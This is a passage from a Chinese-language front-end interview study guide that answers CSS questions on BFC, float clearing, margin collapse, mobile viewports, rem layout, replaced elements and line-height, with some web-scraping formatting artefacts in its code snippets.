（3）如果position的值不为absolute或者fixed，则判断float属性的值是否为none，如果不是，则display的值则按上面的规则转换。注意，如果position的值为relative并且float属性的值存在，则relative相对于浮动后的最终位置定位。 （4）如果float的值为none，则判断元素是否为根元素，如果是根元素则display属性按照上面的规则转换，如果不是，则保持指定的display属性值不变。 总的来说，可以把它看作是一个类似优先级的机制，”position:absolute”和”position:fixed”优先级最高，有它存在的时候，浮动不起作用，’display’的值也需要调整；其次，元素的’float’特性的值不是”none”的时候或者它是根元素的时候，调整’display’的值；最后，非根元素，并且非浮动元素，并且非绝对定位的元素，’display’特性值同设置值。 这从另一个侧面说明了一个问题：浮动或绝对定位的元素，只能是块元素或表格。 26.margin 重叠问题的理解。一般来说可以分为四种情形： 第一种是相邻兄弟元素的marin-bottom和margin-top的值发生重叠。这种情况下我们可以通过设置其中一个元素为BFC来解决。 第二种是父元素的margin-top和子元素的margin-top发生重叠。它们发生重叠是因为它们是相邻的，所以我们可以通过这一点来解决这个问题。我们可以为父元素设置border-top、padding-top值来分隔它们，当然我们也可以将父元素设置为BFC来解决。 第三种是高度为auto的父元素的margin-bottom和子元素的margin-bottom发生重叠。它们发生重叠一个是因为它们相邻，一个是因为父元素的高度不固定。因此我们可以为父元素设置border-bottom、padding-bottom来分隔它们，也可以为父元素设置一个高度，max-height和min-height也能解决这个问题。当然将父元素设置为BFC是最简单的方法。 第四种情况，是没有内容的元素，自身的margin-top和margin-bottom发生的重叠。我们可以通过为其设置border、padding或者高度来解决这个问题。 27.对 BFC 规范（块级格式化上下文：blockformattingcontext）的理解？ BFC指的是块级格式化上下文，一个元素形成了BFC之后，那么它内部元素产生的布局不会影响到外部元素，外部元素的布局也不会影响到BFC中的内部元素。一个BFC就像是一个隔离区域，和其他区域互不影响。 创建BFC （1）根元素或包含根元素的元素（2）浮动元素float＝left|right或inherit（≠none）（3）绝对定位元素position＝absolute或fixed（4）display＝inline-block|flex|inline-flex|table-cell或table-caption（5）overflow＝hidden|auto或scroll(≠visible) 28.浮动带来的影响 浮动元素可以左右移动，直到遇到另一个浮动元素或者遇到它外边缘的包含框。浮动框不属于文档流中的普通流，当元素浮动之后，不会影响块级元素的布局，只会影响内联元素布局。此时文档流中的普通流就会表现得该浮动框不存在一样的布局模式。当包含框的高度小于浮动框的时候，此时就会出现“高度塌陷”。 清除浮动是为了清除使用浮动元素产生的影响。浮动的元素，高度会塌陷，而高度的塌陷使我们页面后面的布局不能正常显示。 29.如何清除浮动 （1）使用clear属性清除浮动。 （2）使用BFC块级格式化上下文来清除浮动。 因为BFC元素不会影响外部元素的特点，所以BFC元素也可以用来清除浮动的影响，因为如果不清除，子元素浮动则父元素高度塌陷，必然会影响后面元素布局和定位，这显然有违BFC元素的子元素不会影响外部元素的设定。 30.使用 clear 属性清除浮动的原理？ 官方对clear属性的解释是：“元素盒子的边不能和前面的浮动元素相邻。”， 所以clear:both并不是清除浮动，而是清除浮动元素对当前元素所造成的影响，浮动的盒子依旧是部分脱离文档流的 还需要注意的一点是clear属性指的是元素盒子的边不能和前面的浮动元素相邻，注意这里“前面的”3个字，也就是clear属性对“后面的”浮动元素是不闻不问的。考虑到float属性要么是left，要么是right，不可能同时存在，同时由于clear属性对“后面的”浮动元素不闻不问，因此，当clear:left有效的时候，clear:right必定无效，也就是此时clear:left等同于设置clear:both；同样地，clear:right如果有效也是等同于设置clear:both。由此可见，clear:left和clear:right这两个声明就没有任何使用的价值，至少在CSS世界中是如此，直接使用clear:both吧 一般使用伪元素的方式清除浮动 12345.clear::after&#123; content:''; display:table;//也可以是'block'，或者是'list-item' clear:both;&#125; clear属性只有块级元素才有效的，而::after等伪元素默认都是内联水平，这就是借助伪元素清除浮动影响时需要设置display属性值的原因。 clear-both深度解析 31.zoom:1 的清除浮动原理? 清除浮动，触发hasLayout； zoom属性是IE浏览器的专有属性，它可以设置或检索对象的缩放比例。解决ie下比较奇葩的bug。譬如外边距（margin）的重叠，浮动清除，触发ie的haslayout属性等。 来龙去脉大概如下：当设置了zoom的值之后，所设置的元素就会就会扩大或者缩小，高度宽度就会重新计算了，这里一旦改变zoom值时其实也会发生重新渲染，运用这个原理，也就解决了ie下子元素浮动时候父元素不随着自动扩大的问题。 zoom属性是IE浏览器的专有属性，火狐和老版本的webkit核心的浏览器都不支持这个属性。然而，zoom现在已经被逐步标准化，出现在CSS3.0规范草案中。 目前非ie由于不支持这个属性，它们又是通过什么属性来实现元素的缩放呢？可以通过css3里面的动画属性scale进行缩放。 32.移动端的适配方案 （1）通过媒体查询的方式即CSS3的meida queries（2）以天猫首页为代表的 flex 弹性布局（3）以淘宝首页为代表的 rem+viewport缩放（4）rem 方式 33.关于媒体查询 当媒体查询为真时，相关的样式表或样式规则会按照正常的级联规被应用。当媒体查询返回假，标签上带有媒体查询的样式表仍将被下载（只不过不会被应用）。 包含了一个媒体类型和至少一个使用宽度、高度和颜色等媒体属性来限制样式表范围的表达式。CSS3加入的媒体查询使得无需修改内容便可以使样式应用于某些特定的设备范围。 34.CSS 优化、提高性能的方法有哪些？加载性能： （1）css压缩：将写好的css进行打包压缩，可以减少很多的体积。（2）css单一样式：当需要下边距和左边距的时候，很多时候选择:margin:top0bottom0;但margin-bottom:bottom;margin-left:left;执行的效率更高。（3）减少使用@import,而建议使用link，因为后者在页面加载时一起加载，前者是等待页面加载完成之后再进行加载。 选择器性能： （1）关键选择器（keyselector）。选择器的最后面的部分为关键选择器（即用来匹配目标元素的部分）。CSS选择符是从右到左进行匹配的。当使用后代选择器的时候，浏览器会遍历所有子元素来确定是否是指定的元素等等；（2）如果规则拥有ID选择器作为其关键选择器，则不要为规则增加标签。过滤掉无关的规则（这样样式系统就不会浪费时间去匹配它们了）。（3）避免使用通配规则，如*{}计算次数惊人！只对需要用到的元素进行选择。（4）尽量少的去对标签进行选择，而是用class。（5）尽量少的去使用后代选择器，降低选择器的权重值。后代选择器的开销是最高的，尽量将选择器的深度降到最低，最高不要超过三层，更多的使用类来关联每一个标签元素。（6）了解哪些属性是可以通过继承而来的，然后避免对这些属性重复指定规则。 渲染性能： （1）慎重使用高性能属性：浮动、定位。（2）尽量减少页面重排、重绘。（3）去除空规则：｛｝。空规则的产生原因一般来说是为了预留样式。去除这些空规则无疑能减少css文档体积。（4）属性值为0时，不加单位。（5）属性值为浮动小数0.**，可以省略小数点之前的0。（6）标准化各种浏览器前缀：带浏览器前缀的在前。标准属性在后。（7）不使用@import前缀，它会影响css的加载速度。（8）选择器优化嵌套，尽量避免层级过深。（9）css雪碧图，同一页面相近部分的小图标，方便使用，减少页面的请求次数，但是同时图片本身会变大，使用时，优劣考虑清楚，再使用。（10）正确使用display的属性，由于display的作用，某些样式组合会无效，徒增样式体积的同时也影响解析性能。（11）不滥用web字体。对于中文网站来说WebFonts可能很陌生，国外却很流行。webfonts通常体积庞大，而且一些浏览器在下载webfonts时会阻塞页面渲染损伤性能。 可维护性、健壮性： （1）将具有相同属性的样式抽离出来，整合并通过class在页面中进行使用，提高css的可维护性。（2）样式与内容分离：将css代码定义到外部css中。 35.浏览器是怎样解析 CSS 选择器的？样式系统从关键选择器开始匹配，然后左移查找规则选择器的祖先元素。只要选择器的子树一直在工作，样式系统就会持续左移，直到和规则匹配，或者是因为不匹配而放弃该规则。 试想一下，如果采用从左至右的方式读取CSS规则，那么大多数规则读到最后（最右）才会发现是不匹配的，这样做会费时耗能，最后有很多都是无用的；而如果采取从右向左的方式，那么只要发现最右边选择器不匹配，就可以直接舍弃了，避免了许多无效匹配。 为什么css选择器是从右往左匹配的 36.在网页中应该使用奇数还是偶数的字体？为什么呢？ （1）偶数字号相对更容易和web设计的其他部分构成比例关系。比如：当我用了14px的正文字号，我可能会在一些地方用14×0.5=7px的margin，在另一些地方用14×1.5=21px的标题字号。（2）浏览器缘故，低版本的浏览器ie6会把奇数字体强制转化为偶数，即13px渲染为14px。（3）系统差别，早期的Windows里，中易宋体点阵只有12和14、15、16px，唯独缺少13px。 37.margin 和 padding 分别适合什么场景使用？ margin是用来隔开元素与元素的间距；padding是用来隔开元素与内容的间隔。margin用于布局分开元素使元素与元素互不相干。padding用于元素与内容之间的间隔，让内容（文字）与（包裹）元素之间有一段距离。 何时应当使用margin： •需要在border外侧添加空白时。•空白处不需要背景（色）时。•上下相连的两个盒子之间的空白，需要相互抵消时。如15px+20px的margin，将得到20px的空白。 何时应当时用padding： •需要在border内测添加空白时。•空白处需要背景（色）时。•上下相连的两个盒子之间的空白，希望等于两者之和时。如15px+20px的padding，将得到35px的空白。 38.抽离样式模块怎么写，说出思路我的理解是把常用的css样式单独做成css文件……通用的和业务相关的分离出来，通用的做成样式模块儿共享，业务相关的，放进业务相关的库里面做成对应功能的模块儿。 39.简单说一下 css3 的 all 属性。 all属性实际上是所有CSS属性的缩写，表示，所有的CSS属性都怎样怎样，但是，不包括unicode-bidi和direction这两个CSS属性。 为什么会有这个CSS属性呢？ 我们可能知道，有些CSS属性值基本上所有CSS属性都有，比方说继承inherit! 我们CSS reset输入框的时候，是不是有类似这样的代码（实际可能是具体值，作用类似）：12345input, textarea &#123; color: inherit; font-size: inherit; font-family: inherit;&#125;因为这类输入控件自身有内置的大小和字体，需要重置。 此时，大家就会发现，这些属性值都是inherit, 要是可以合并就好了！ 哟哟哟，说到点子上了，CSS all属性就是用来合并的。123input, textarea &#123; all: inherit; &#125;喔噢，三合一，顿时一阵春风拂面之感。但是，这里仅仅是展示作用，实际上是不会这么用的，因为，all:inherit会让背景色什么的，都继承父级，相信这不是你希望看到的。 40.为什么不建议使用统配符初始化 css 样式。 采用*{pading:0;margin:0;}这样的写法好处是写起来很简单，但是是通配符，需要把所有的标签都遍历一遍，当网站较大时，样式比较多，这样写就大大的加强了网站运行的负载，会使网站加载的时候需要很长一段时间，因此一般大型的网站都有分层次的一套初始化样式。 出于性能的考虑，并不是所有标签都会有padding和margin，因此对常见的具有默认padding和margin的元素初始化即可，并不需使用通配符*来初始化。 上面就提到了，浏览器在解析css选择器时，通过从右到左的方式尽可能减少遍历的节点数量，努力提高性能。但是一个通配符选择器就可以让这些努力付之东流 41.absolute 的 containingblock（包含块）计算方式跟正常流有什么不同？ （1）内联元素也可以作为“包含块”所在的元素；（2）“包含块”所在的元素不是父块级元素，而是最近的position不为static的祖先元素或根元素；（3）边界是paddingbox而不是contentbox。 42.对于 hasLayout 的理解》hasLayout是IE特有的一个属性。很多的IE下的cssbug都与其息息相关。在IE中，一个元素要么自己对自身的内容进行计算大小和组织，要么依赖于父元素来计算尺寸和组织内容。当一个元素的hasLayout属性值为true时，它负责对自己和可能的子孙元素进行尺寸计算和定位。虽然这意味着这个元素需要花更多的代价来维护自身和里面的内容，而不是依赖于祖先元素来完成这些工作。 43.元素竖向的百分比设定是相对于容器的高度吗？ 如果是height的话，是相对于包含块的高度。 如果是padding或者margin竖直方向的属性则是相对于包含块的宽度。 44.全屏滚动的原理是什么？用到了 CSS 的哪些属性？（待深入实践） 原理：有点类似于轮播，整体的元素一直排列下去，假设有5个需要展示的全屏页面，那么高度是500%，只是展示100%，容器及容器内的页面取当前可视区高度，同时容器的父级元素overflow属性值设为hidden，通过更改容器可视区的位置来实现全屏滚动效果。主要是响应鼠标事件，页面通过CSS的动画效果，进行移动。12overflow：hidden；transition：all 1000ms ease； 45.什么是响应式设计？响应式设计的基本原理是什么？如何兼容低版本的 IE？ 响应式网站设计是一个网站能够兼容多个终端，而不是为每一个终端做一个特定的版本。基本原理是通过媒体查询检测不同的设备屏幕尺寸做处理。页面头部必须有meta声明的viewport。 47.如何修改 chrome 记住密码后自动填充表单的黄色背景？chrome表单自动填充后，input文本框的背景会变成黄色的，通过审查元素可以看到这是由于chrome会默认给自动填充的input表单加上input:-webkit-autofill私有属性，然后对其赋予以下样式：12345&#123;background-color:rgb(250,255,189)!important;background-image:none!important;color:rgb(0,0,0)!important;&#125;对chrome默认定义的background-color，background-image，color使用important是不能提高其优先级的，但是其他属性可使用。使用足够大的纯色内阴影来覆盖input输入框的黄色背景，处理如下 1234input:-webkit-autofill,textarea:-webkit-autofill,select:-webkit-autofill&#123;-webkit-box-shadow:000px1000pxwhiteinset;border:1pxsolid#CCC!important;&#125; 48.怎么让 Chrome 支持小于 12px 的文字？在谷歌下css设置字体大小为12px及以下时，显示都是一样大小，都是默认12px。 （1）可以使用Webkit的内核的-webkit-text-size-adjust的私有CSS属性来解决，只要加了-webkit-text-size-adjust:none;字体大小就不受限制了。但是chrome更新到27版本之后就不可以用了。所以高版本chrome谷歌浏览器已经不再支持-webkit-text-size-adjust样式，所以要使用时候慎用。 （2）还可以使用css3的transform缩放属性-webkit-transform:scale(0.5);注意-webkit-transform:scale(0.75);收缩的是整个元素的大小，这时候，如果是内联元素，必须要将内联元素转换成块元素，可以使用display：block/inline-block/…； （3）使用图片：如果是内容固定不变情况下，使用将小于12px文字内容切出做图片，这样不影响兼容也不影响美观。 49.让页面里的字体变清晰，变细用 CSS 怎么做？ webkit内核的私有属性：-webkit-font-smoothing，用于字体抗锯齿，使用后字体看起来会更清晰舒服。 -webkit-font-smoothing它有三个属性值：none：对低像素的文本比较好subpixel-antialiased：默认值antialiased：抗锯齿很好 在MacOS测试环境下面设置-webkit-font-smoothing:antialiased;但是这个属性仅仅是面向MacOS，其他操作系统设置后无效。 50.font-style 属性中 italic 和 oblique 的区别？ italic和oblique这两个关键字都表示“斜体”的意思。 它们的区别在于，italic是使用当前字体的斜体字体，而oblique只是单纯地让文字倾斜。如果当前字体没有对应的斜体字体，则退而求其次，解析为oblique，也就是单纯形状倾斜。 51.设备像素、css 像素、设备独立像素、dpr、ppi 之间的区别？ 设备像素指的是物理像素，一般手机的分辨率指的就是设备像素，一个设备的设备像素是不可变的。 css像素和设备独立像素是等价的，不管在何种分辨率的设备上，css像素的大小应该是一致的，css像素是一个相对单位，它是相对于设备像素的，一个css像素的大小取决于页面缩放程度和dpr的大小。 dpr指的是设备像素和设备独立像素的比值，一般的pc屏幕，dpr=1。在iphone4时，苹果推出了retina屏幕，它的dpr为2。屏幕的缩放会改变dpr的值。 ppi指的是每英寸的物理像素的密度，ppi越大，屏幕的分辨率越大。 52.layoutviewport、visualviewport 和 idealviewport 的区别？移动端一共需要理解三个viewport的概念的理解。 第一个视口是布局视口，在移动端显示网页时，由于移动端的屏幕尺寸比较小，如果网页使用移动端的屏幕尺寸进行布局的话，那么整个页面的布局都会显示错乱。所以移动端浏览器提供了一个layoutviewport布局视口的概念，使用这个视口来对页面进行布局展示，一般layoutviewport的大小为980px，因此页面布局不会有太大的变化，我们可以通过拖动和缩放来查看到这个页面。 第二个视口指的是视觉视口，visualviewport指的是移动设备上我们可见的区域的视口大小，一般为屏幕的分辨率的大小。visualviewport和layoutviewport的关系，就像是我们通过窗户看外面的风景，视觉视口就是窗户，而外面的风景就是布局视口中的网页内容。 第三个视口是理想视口，由于layoutviewport一般比visualviewport要大，所以想要看到整个页面必须通过拖动和缩放才能实现。所以又提出了idealviewport的概念，idealviewport下用户不用缩放和滚动条就能够查看到整个页面，并且页面在不同分辨率下显示的内容大小相同。idealviewport其实就是通过修改layoutviewport的大小，让它等于设备的宽度，这个宽度可以理解为是设备独立像素，因此根据idealviewport设计的页面，在不同分辨率的屏幕下，显示应该相同。 53.position:fixed;在 android 下无效怎么处理？ 因为移动端浏览器默认的viewport叫做layoutviewport。在移动端显示时，因为layoutviewport的宽度大于移动端屏的宽度，所以页面会出现滚动条左右移动，fixed的元素是相对layoutviewport来固定位置的，而不是移动端屏幕来固定位置的，所以会出现感觉fixed无效的情况。 如果想实现fixed相对于屏幕的固定效果，我们需要改变的是viewport的大小为idealviewport，可以如下设置： 1&lt;meta name=\"viewport\"content=\"width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no\"/&gt; 54.如果需要手动写动画，你认为最小时间间隔是多久，为什么？ 多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60*1000ms＝16.7ms 55.如何让去除 inline-block 元素间间距？. 移除空格、使用margin负值、使用font-size:0、letter-spacing、word-spacing 56.overflow:scroll 时不能平滑滚动的问题怎么处理？启用了硬件加速特性:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283## 57.有一个高度自适应的 div，里面有两个 div，一个高度 100px，希望另一个填满剩下的高度。&gt;（1）外层div使用position：relative；高度要求自适应的div使用position:absolute;top:100px;bottom:0;left:0;right:0;&gt;（2）使用flex布局，设置主轴为竖轴，第二个div的flex-grow为1。## 58.png、jpg、gif 这些图片格式解释一下，分别什么时候用。有没有了解过 webp&gt;（1）第一种是BMP格式，它是无损压缩的，支持索引色和直接色的点阵图。由于它基本上没有进行压缩，因此它的文件体积一般比较大。&gt;（2）第二种是GIF格式，它是无损压缩的使用索引色的点阵图。由于使用了LZW压缩方法，因此文件的体积很小。并且GIF还支持动画和透明度。但因为它使用的是索引色，所以它适用于一些对颜色要求不高且需要文件体积小的场景。&gt;（3）第三种是JPEG格式，它是有损压缩的使用直接色的点阵图。由于使用了直接色，色彩较为丰富，一般适用于来存储照片。但由于使用的是直接色，可能文件的体积相对于GIF格式来说更大。&gt;（4）第四种是PNG-8格式，它是无损压缩的使用索引色的点阵图。它是GIF的一种很好的替代格式，它也支持透明度的调整，并且文件的体积相对于GIF格式更小。一般来说如果不是需要动画的情况，我们都可以使用PNG-8格式代替GIF格式。&gt;（5）第五种是PNG-24格式，它是无损压缩的使用直接色的点阵图。PNG-24的优点是它使用了压缩算法，所以它的体积比BMP格式的文件要小得多，但是相对于其他的几种格式，还是要大一些。&gt;（6）第六种格式是svg格式，它是矢量图，它记录的图片的绘制方式，因此对矢量图进行放大和缩小不会产生锯齿和失真。它一般适合于用来制作一些网站logo或者图标之类的图片。&gt;（7）第七种格式是webp格式，它是支持有损和无损两种压缩方式的使用直接色的点阵图。使用webp格式的最大的优点是，在相同质量的文件下，它拥有更小的文件体积。因此它非常适合于网络图片的传输，因为图片体积的减少，意味着请求时间的减小，这样会提高用户的体验。这是谷歌开发的一种新的图片格式，目前在兼容性上还不是太好。## 59.如何判断是否支持 webp 格式图片&gt;（1）宽高判断法。通过创建image对象，将其src属性设置为webp格式的图片，然后在onload事件中获取图片的宽高，如果能够获取，则说明浏览器支持webp格式图片。如果不能获取或者触发了onerror函数，那么就说明浏览器不支持webp格式的图片。&gt;（2）canvas判断方法。我们可以动态的创建一个canvas对象，通过canvas的toDataURL将设置为webp格式，然后判断返回值中是否含有image&#x2F;webp字段，如果包含则说明支持WebP，反之则不支持。## 60.什么是 Cookie 隔离？（或者说：请求资源的时候不要让它带 cookie 怎么做）&gt;网站向服务器请求的时候，会自动带上cookie这样增加表头信息量，使请求变慢。&gt;如果静态文件都放在主域名下，那静态文件请求的时候都带有的cookie的数据提交给server的，非常浪费流量，所以不如隔离开，静态资源放CDN。&gt;因为cookie有域的限制，因此不能跨域提交请求，故使用非主要域名的时候，请求头中就不会带有cookie数据，这样可以降低请求头的大小，降低请求时间，从而达到降低整体请求延时的目的。&gt;同时这种方式不会将cookie传入WebServer，也减少了WebServer对cookie的处理分析环节，提高了webserver的http请求的解析速度。## 61.style 标签写在 body 后与 body 前有什么区别？&gt;页面加载自上而下当然是先加载样式。写在body标签后由于浏览器以逐行方式对HTML文档进行解析，当解析到写在尾部的样式表（外联或写在style标签）会导致浏览器停止之前的渲染，等待加载且解析样式表完成之后重新渲染，在windows的IE下可能会出现FOUC现象（即样式失效导致的页面闪烁问题）## 62.什么是 CSS 预处理器？&gt;CSS预处理器定义了一种新的语言，其基本思想是，用一种专门的编程语言，为CSS增加了一些编程的特性，将CSS作为目标生成文件，然后开发者就只要使用这种语言进行编码工作。通俗的说，CSS预处理器用一种专门的编程语言，进行Web页面样式设计，然后再编译成正常的CSS文件。&gt;预处理器例如：LESS、Sass、Stylus，用来预编译Sass或lesscsssprite，增强了css代码的复用性，还有层级、mixin、变量、循环、函数等，具有很方便的UI组件模块化开发能力，极大的提高工作效率。## 63.阐述一下 CSSSprites&gt;将一个页面涉及到的所有图片都包含到一张大图中去，然后利用CSS的background-image，background-repeat，background-position的组合进行背景定位。利用CSSSprites能很好地减少网页的http请求，从而很好的提高页面的性能；CSSSprites能减少图片的字节。优点：&gt;减少HTTP请求数，极大地提高页面加载速度增加图片信息重复度，提高压缩比，减少图片大小更换风格方便，只需在一张或几张图片上修改颜色或样式即可实现缺点：&gt;图片合并麻烦维护麻烦，修改一个图片可能需要重新布局整个图片，样式## 64.使用 rem 布局的优缺点？优点：&gt;在屏幕分辨率千差万别的时代，只要将rem与屏幕分辨率关联起来就可以实现页面的整体缩放，使得在设备上的展现都统一起来了。而且现在浏览器基本都已经支持rem了，兼容性也非常的好。缺点：&gt;（1）在奇葩的dpr设备上表现效果不太好，比如一些华为的高端机型用rem布局会出现错乱。（2）使用iframe引用也会出现问题。（3）rem在多屏幕尺寸适配上与当前两大平台的设计哲学不一致。即大屏的出现到底是为了看得又大又清楚，还是为了看的更多的问题。## 65. 为什么设计稿是750px我们通过动态的获取设备独立像素，然后除以设计稿的宽度，然后赋给根字体的fontsize，以致来动态改变跟字体大小，做到自适应。但至于为什么要乘100，首先375 &#x2F; 750是0.5，浏览器默认最小字体为12px，所以我们需要放大一些，而100又很好算，我们只需要将设计稿量出来的长度（px），小数点向左移2位，单位变成rem就好了。例子：比如给你个&#96;&#96;&#96;40*40&#96;&#96;&#96;的图片设计稿，dpr为2的屏幕上我们需要设置20*20的px值，对于不同dpr的屏幕，就可以用上述的方法进行适配，适配完之后&#96;&#96;&#96;40 * 0.01 * 50 &#x3D; 20px&#96;&#96;&#96;，可见结果是一样的&#96;&#96;&#96;js(function () &#123; function changeRootFont() &#123; var designWidth &#x3D; 750, rem2px &#x3D; 100; document.documentElement.style.fontsize &#x3D; ((window.innerWidth &#x2F; designWidth) * rem2px) + &#39;px&#39;; &#x2F;&#x2F;iphone6: (375 &#x2F; 750) * 100 + &#39;px&#39;; &#125; changeRootFont(); window.addEventListener(&#39;resize&#39;, changeRootFont,false);&#125;)(); 66.画一条 0.5px 的线在css里最低的单位就是1px了，那么如果给真机一个1px的边框，会出现2像素的宽，如何解决这个问题呢？1tranform:scal(0.5); 67.transition 和 animation 的区别 transition关注的是CSSproperty的变化，property值和时间的关系是一个三次贝塞尔曲线。 animation作用于元素本身而不是样式属性，可以使用关键帧的概念，应该说可以实现更自由的动画效果。 68.什么是首选最小宽度？ “首选最小宽度”，指的是元素最适合的最小宽度。 东亚文字（如中文）最小宽度为每个汉字的宽度。 西方文字最小宽度由特定的连续的英文字符单元决定。并不是所有的英文字符都会组成连续单元，一般会终止于空格（普通空格）、短横线、问号以及其他非英文字符等。 如果想让英文字符和中文一样，每一个字符都用最小宽度单元，可以试试使用CSS中的word-break:break-all。 69.为什么 height:100%会无效？ 对于普通文档流中的元素，百分比高度值要想起作用，其父级必须有一个可以生效的高度值。 原因是如果包含块的高度没有显式指定（即高度由内容决定），并且该元素不是绝对定位，则计算值为auto，因为解释成了auto，所以无法参与计算。 使用绝对定位的元素会有计算值，即使祖先元素的height计算为auto也是如此。 70.min-width/max-width 和 min-height/max-height 属性间的覆盖规则？ （1）max-width会覆盖width，即使width是行类样式或者设置了!important。 （2）min-width会覆盖max-width，此规则发生在min-width和max-width冲突的时候。 71.内联盒模型基本概念 （1）内容区域（contentarea）。内容区域指一种围绕文字看不见的盒子，其大小仅受字符本身特性控制，本质上是一个字符盒子（characterbox）；但是有些元素，如图片这样的替换元素，其内容显然不是文字，不存在字符盒子之类的，因此，对于这些元素，内容区域可以看成元素自身。 （2）内联盒子（inlinebox）。“内联盒子”不会让内容成块显示，而是排成一行，这里的“内联盒子”实际指的就是元素的“外在盒子”，用来决定元素是内联还是块级。该盒子又可以细分为“内联盒子”和“匿名内联盒子”两类。 （3）行框盒子（linebox），每一行就是一个“行框盒子”（实线框标注），每个“行框盒子”又是由一个一个“内联盒子”组成的。 （4）包含块（containingbox），由一行一行的“行框盒子”组成。 72.什么是幽灵空白节点？ “幽灵空白节点”是内联盒模型中非常重要的一个概念，具体指的是：在HTML5文档声明中，内联元素的所有解析和渲染表现就如同每个行框盒子的前面有一个“空白节点”一样。这个“空白节点”永远透明，不占据任何宽度，看不见也无法通过脚本获取，就好像幽灵一样，但又确确实实地存在，表现如同文本节点一样，因此，我称之为“幽灵空白节点”。 73.什么是替换元素？ 通过修改某个属性值呈现的内容就可以被替换的元素就称为“替换元素”。因此，&lt;img&gt;、&lt;object&gt;、&lt;video&gt;、&lt;iframe&gt;或者表单元素&lt;textarea&gt;和&lt;input&gt;和&lt;select&gt;都是典型的替换元素。 替换元素除了内容可替换这一特性以外，还有以下一些特性。 （1）内容的外观不受页面上的CSS的影响。用专业的话讲就是在样式表现在CSS作用域之外。如何更改替换元素本身的外观需要类似appearance属性，或者浏览器自身暴露的一些样式接口， （2）有自己的尺寸。在Web中，很多替换元素在没有明确尺寸设定的情况下，其默认的尺寸（不包括边框）是300像素×150像素，如&lt;video&gt;、&lt;iframe&gt;或者&lt;canvas&gt;等，也有少部分替换元素为0像素，如&lt;img&gt;图片，而表单元素的替换元素的尺寸则和浏览器有关，没有明显的规律。 （3）在很多CSS属性上有自己的一套表现规则。比较具有代表性的就是vertical-align属性，对于替换元素和非替换元素，vertical-align属性值的解释是不一样的。比方说vertical-align的默认值的baseline，很简单的属性值，基线之意，被定义为字符x的下边缘，而替换元素的基线却被硬生生定义成了元素的下边缘。 （4）所有的替换元素都是内联水平元素，也就是替换元素和替换元素、替换元素和文字都是可以在一行显示的。但是，替换元素默认的display值却是不一样的，有的是inline，有的是inline-block。 74.替换元素的计算规则？替换元素的尺寸从内而外分为3类：固有尺寸、HTML尺寸和CSS尺寸。 （1）固有尺寸指的是替换内容原本的尺寸。例如，图片、视频作为一个独立文件存在的时候，都是有着自己的宽度和高度的。 （2）HTML尺寸只能通过HTML原生属性改变，这些HTML原生属性包括&lt;img&gt;的width和height属性、&lt;input&gt;的size属性、&lt;textarea&gt;的cols和rows属性等。 （3）CSS尺寸特指可以通过CSS的width和height或者max-width/min-width和max-height/min-height设置的尺寸，对应盒尺寸中的contentbox。 这3层结构的计算规则具体如下 （1）如果没有CSS尺寸和HTML尺寸，则使用固有尺寸作为最终的宽高。 （2）如果没有CSS尺寸，则使用HTML尺寸作为最终的宽高。 （3）如果有CSS尺寸，则最终尺寸由CSS属性决定。 （4）如果“固有尺寸”含有固有的宽高比例，同时仅设置了宽度或仅设置了高度，则元素依然按照固有的宽高比例显示。 （5）如果上面的条件都不符合，则最终宽度表现为300像素，高度为150像素。 （6）内联替换元素和块级替换元素使用上面同一套尺寸计算规则。 75.content 与替换元素的关系content属性生成的对象称为“匿名替换元素”。 （1）我们使用content生成的文本是无法选中、无法复制的，好像设置了userselect:none声明一般，但是普通元素的文本却可以被轻松选中。同时，content生成的文本无法被屏幕阅读设备读取，也无法被搜索引擎抓取，因此，千万不要自以为是地把重要的文本信息使用content属性生成，因为这对可访问性和SEO都很不友好。 （2）content生成的内容不能左右:empty伪类。 （3）content动态生成值无法获取。 76.margin:auto 的填充规则？margin的’auto’可不是摆设，是具有强烈的计算意味的关键字，用来计算元素对应方向应该获得的剩余间距大小。但是触发margin:auto计算有一个前提条件，就是width或height为auto时，元素是具有对应方向的自动填充特性的。 （1）如果一侧定值，一侧auto，则auto为剩余空间大小。（2）如果两侧均是auto，则平分剩余空间。 77.margin 无效的情形 （1）display计算值inline的非替换元素的垂直margin是无效的。对于内联替换元素，垂直margin有效，并且没有margin合并的问题。 （2）表格中的和元素或者设置display计算值是table-cell或table-row的元素的margin都是无效的。 （3）绝对定位元素非定位方位的margin值“无效”。 （4）定高容器的子元素的margin-bottom或者宽度定死的子元素的margin-right的定位“失效”。 78.border 的特殊性？ （1）border-width不支持百分比。 （2）border-style的默认值是none，有一部分人可能会误以为是solid。这也是单纯设置border-width或border-color没有边框显示的原因。 （3）border-style:double的表现规则：双线宽度永远相等，中间间隔±1。 （4）border-color默认颜色就是color色值。 （5）默认background背景图片是相对于paddingbox定位的。 79.什么是基线和 x-height？ 字母x的下边缘（线）就是我们的基线。 x-height指的就是小写字母x的高度，术语描述就是基线和等分线（meanline）（也称作中线，midline）之间的距离。在CSS世界中，middle指的是基线往上1/2x-height高度。我们可以近似理解为字母x交叉点那个位置。 ex是CSS中的一个相对单位，指的是小写字母x的高度，没错，就是指x-height。ex的价值就在其副业上不受字体和字号影响的内联元素的垂直居中对齐效果。内联元素默认是基线对齐的，而基线就是x的底部，而1ex就是一个x的高度。 80.line-height 的特殊性？ （1）对于非替换元素的纯内联元素，其可视高度完全由line-height决定。对于文本这样的纯内联元素，line-height就是高度计算的基石，用专业说法就是指定了用来计算行框盒子高度的基础高度。 （2）内联元素的高度由固定高度和不固定高度组成，这个不固定的部分就是这里的“行距”。换句话说，line-height之所以起作用，就是通过改变“行距”来实现的。在CSS中，“行距”分散在当前文字的上方和下方，也就是即使是第一行文字，其上方也是有“行距”的，只不过这个“行距”的高度仅仅是完整“行距”高度的一半，因此，也被称为“半行距”。 （3）行距=line-height-font-size。 （4）border以及line-height等传统CSS属性并没有小数像素的概念。如果标注的是文字上边距，则向下取整；如果是文字下边距，则向上取整。 （5）对于纯文本元素，line-height直接决定了最终的高度。但是，如果同时有替换元素，则line-height只能决定最小高度。 （6）对于块级元素，line-height对其本身是没有任何作用的，我们平时改变line-height，块级元素的高度跟着变化实际上是通过改变块级元素里面内联级别元素占据的高度实现的。 （7）line-height的默认值是normal，还支持数值、百分比值以及长度值。为数值类型时，其最终的计算值是和当前font-size相乘后的值。为百分比值时，其最终的计算值是和当前font-size相乘后的值。为长度值时原意不变。 